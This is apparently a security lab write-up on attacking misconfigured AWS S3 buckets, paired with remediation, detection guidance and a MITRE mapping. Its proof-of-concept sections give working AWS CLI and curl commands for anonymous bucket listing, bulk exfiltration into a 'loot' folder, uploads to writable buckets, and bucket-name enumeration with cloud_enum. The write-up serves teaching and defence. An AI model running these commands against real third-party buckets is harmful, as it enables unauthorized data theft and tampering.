> **English** | [Italiano](README.md)

# AWS S3 Bucket Attacks - Exposed Storage and Misconfigurations

> - **Phase:** Cloud Security - Data Access (AWS S3)
> - **Visibility:** Low/Medium - access to a public bucket does not require authentication and may leave no traces on the attacker's side; authenticated accesses are in CloudTrail if data event logging is enabled
> - **Prerequisites:** The bucket name (from OSINT, subdomains, leaks) or credentials with S3 permissions; AWS CLI or anonymous HTTP access
> - **Output:** Finding CLOUD-002; read/write access to misconfigured storage; exfiltration or tampering of data

- **Operating Environment:** AWS (author's lab bucket), AWS CLI, HTTP access
- **Main tools:** aws-cli, cloud_enum, s3scanner

---

## Executive Summary

Amazon S3 (Simple Storage Service) is AWS's object storage service, and its misconfigurations are among the most common and most serious causes of cloud data breaches. The recurring problem is simple: buckets configured as public or with too-permissive ACLs, which expose to anyone - often without any authentication - data that should be private. Backups, database dumps, internal documents, credentials: the breach news is full of "exposed S3 bucket".

Finding CLOUD-002 documents two scenarios: the discovery and access to a public bucket (accessible via anonymous HTTP or `aws s3 ls --no-sign-request`), and the exploitation of writable ACLs that allow not only reading but modifying or uploading content (with serious implications if the bucket serves content to a site or an application). The root is always a customer-side misconfiguration, consistent with the Shared Responsibility Model: AWS provides secure storage, the customer makes it public by mistake.

---

## Folder Structure

```
S3-buckets-attacks/
+-- README.md      # this file: exposed buckets and misconfigurations (CLOUD-002)
+-- img/           # bucket enumeration and data access
```

---

## Discovery and Access to Misconfigured Buckets

**Finding ID:** `CLOUD-002` | **Severity:** `High` (unauthorized access to exposed storage; exfiltration of data or tampering of content)

### Operational Context

S3 buckets have globally unique and often predictable names (`companyname-backup`, `companyname-assets`, `companyname-logs`). This makes them enumerable: an attacker generates plausible names and checks which ones exist and which are accessible. A public bucket requires no credential.

### PoC - Enumeration and anonymous access

```Bash
# Verify a bucket via anonymous HTTP
curl -s https://companyname-backup.s3.amazonaws.com/ | head

# List the content without authentication (--no-sign-request)
aws s3 ls s3://companyname-backup --no-sign-request
```

```
2026-05-10 02:14:22   4200000  db_dump_2026.sql        <-- exposed DB dump (CLOUD-002)
2026-05-10 02:14:23     18400  employees.csv
2026-05-10 02:14:24    950000  backup_config.tar.gz
```

### PoC - Data exfiltration

```Bash
# Download of the entire public bucket
aws s3 sync s3://companyname-backup ./loot --no-sign-request
```

```
download: s3://companyname-backup/db_dump_2026.sql -> loot/db_dump_2026.sql
[+] 3 files, 5.1 MB exfiltrated without authentication   <-- data breach (CLOUD-002)
```

### PoC - Writable ACL (more serious scenario)

```Bash
# Write test: if the bucket is world-writable, one can upload/overwrite
echo "test" > poc.txt
aws s3 cp poc.txt s3://companyname-assets/poc.txt --no-sign-request
```

```
upload: ./poc.txt -> s3://companyname-assets/poc.txt
[!] Write successful: if the bucket serves web content -> defacement/malware injection
```

### PoC - Automation of the discovery

```Bash
# cloud_enum and s3scanner look for buckets with permutations of the target name
python3 cloud_enum.py -k companyname      # (see ../../../Tooling/cloud-enum/)
```

### Remediation

- **Block Public Access:** enable "S3 Block Public Access" at the account level (blocks every public policy/ACL, even future ones); it is the single most effective control
- **Least privilege on the buckets:** review bucket policies and ACLs; no bucket should be public except for explicit and controlled cases (e.g. static site, and in read-only anyway)
- **Encryption and versioning:** encrypt the data at rest (SSE); enable versioning to recover from tampering
- **Detection:** Prowler/ScoutSuite (`../../../Tooling/`) and AWS Config identify the public buckets; enable data event logging on CloudTrail to trace the accesses to the objects

---

## Lab Experience

The strongest lesson was the triviality of the attack compared to the gravity of the result. There was no exploit, no bypass: a bucket configured as public is simply accessible to anyone who knows its name, with an `aws s3 ls` command. The disproportion between effort (minimal) and impact (an exfiltrated database dump) explains why exposed buckets remain one of the top causes of breaches: they do not require a sophisticated attacker, only an attentive one.

The enumeration of the names proved to be the real work. Since bucket names are global and often follow conventions (`company-environment-purpose`), generating and testing them with cloud_enum turned the search into a dictionary attack. This made concrete that the "security by obscurity" of the name protects nothing: a predictable name is a findable name.

The case of the writable ACL was the most instructive in terms of impact. A public read-only bucket is a data breach; a writable one is much worse - if it serves content to a site or distributes software, an attacker can inject malware or deface it. The difference between `read` and `write` on a single ACL separates the leak of data from active compromise.

---

## Theoretical Analysis: The Secure Default and the Configuration Error

S3 buckets are private by default: AWS made the starting configuration secure. Yet breaches from exposed buckets abound, which reveals a truth about configuration security: the risk is not the default, but the deviation from the default. Someone, to make something work quickly ("make it public so the app can read it"), disables the protection and does not restore it. The misconfiguration is a human act, not a technical flaw.

This illustrates the tension between functionality and security in the cloud. The ease with which one makes a bucket public (a click, a flag) is the same that makes the error easy. The cloud democratizes infrastructure - anyone can create storage - but transfers to the user the responsibility of configuring it securely, often without the competence to do so. The Shared Responsibility Model is clear on paper but in practice it offloads onto the user security decisions they do not always know they are making.

The structural countermeasure - "Block Public Access" at the account level - reflects the right principle: make the insecure deviation hard, not just the secure default. A secure default protects until someone changes it; a block at the account level prevents the dangerous change regardless. It is the difference between "secure if no one makes a mistake" and "secure even if someone makes a mistake" - and only the second is robust, because someone, sooner or later, always makes a mistake.

---

## Real-World Scenario: Post-Exploitation Projection

> Attacker and defender perspectives in a real engagement.

### Attacker Perspective (Red Team)

**Starting point:** access to an exposed S3 bucket containing sensitive data (CLOUD-002).

**Projected kill chain:**

```
[CLOUD-002] Public bucket discovered -> DB dump, config, credentials exfiltrated
        |
        v
The config/credentials in the bucket -> access to other services (DB, API, IAM)
        |
        v
Pivot: AWS credentials in the files -> IAM enumeration (CLOUD-001)
        |
        v
Complete data breach / escalation in the account
```

**Potential impact:** an exposed bucket is often the entry point to broader compromises, because it frequently contains other credentials (config files, `.env`, keys). The direct data breach (customer data, PII) is already serious in itself - with legal (GDPR) and reputational consequences - but the pivot toward other credentials found in the bucket links this finding to CLOUD-001 (IAM) and to a compromise of the entire account.

### Defender Perspective (Blue Team)

**Detection:** AWS Config and GuardDuty flag the public buckets; data event logging on CloudTrail traces the accesses to the objects (without it, an anonymous access can be invisible).

**Indicators of Compromise (IOC):**
- Bucket with public ACLs/policies (configuration audit)
- Massive `GetObject` accesses from unrecognized external IPs (if data logging is active)
- Download of the entire content of a bucket (`sync` pattern)

**Containment and hardening:**
- "Block Public Access" at the account level (primary countermeasure)
- Review and correction of all the public bucket policies/ACLs
- Encryption, versioning, and data event logging
- Continuous audit with Prowler/AWS Config; rotation of every credential found in the exposed buckets

**Defensive lesson:** a public bucket is a breach waiting to happen. The countermeasure is not "checking that no one makes a bucket public" (fallible) but "structurally preventing a bucket from becoming public" (Block Public Access). In the cloud, robust defense makes the error impossible, not just discouraged.

---

## Reference Tools

| Tool | Type | Role | Main use case |
| :--- | :--- | :--- | :--- |
| `aws-cli` | Cloud CLI | Official | Access and enumeration of the buckets |
| `cloud_enum` | Bucket enum | Offensive | Discovery of buckets via name permutations |
| `s3scanner` | S3 scanner | Offensive | Mass testing of bucket existence and permissions |
| `Prowler` | Security scanner | Defensive | Detection of public buckets and misconfig |
| `AWS Config` | Compliance | Defensive | Continuous monitoring of bucket conformity |

> **Recommended modern tool:** offensively `cloud_enum` (`../../../Tooling/cloud-enum/`) for multi-cloud bucket discovery. Defensively, `Prowler` and `AWS Config` for continuous detection, but the decisive countermeasure remains "S3 Block Public Access" at the account level.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Collection | Data from Cloud Storage | `T1530` | Access and exfiltration of data from an exposed S3 bucket (CLOUD-002) |
| Discovery | Cloud Storage Object Discovery | `T1619` | Enumeration of the objects in the bucket |
| Reconnaissance | Search Open Websites/Domains | `T1593` | Discovery of the bucket names via OSINT/permutation |
| Impact | Data Manipulation | `T1565` | Write/tampering on a bucket with a writable ACL |

---

> **Note:** All documented activities were conducted on S3 buckets owned by the author. Accessing third-party cloud storage without authorization is a crime (unauthorized access) and violates the provider's terms, even when the bucket is technically public. Techniques are documented for educational and authorized security assessment purposes.
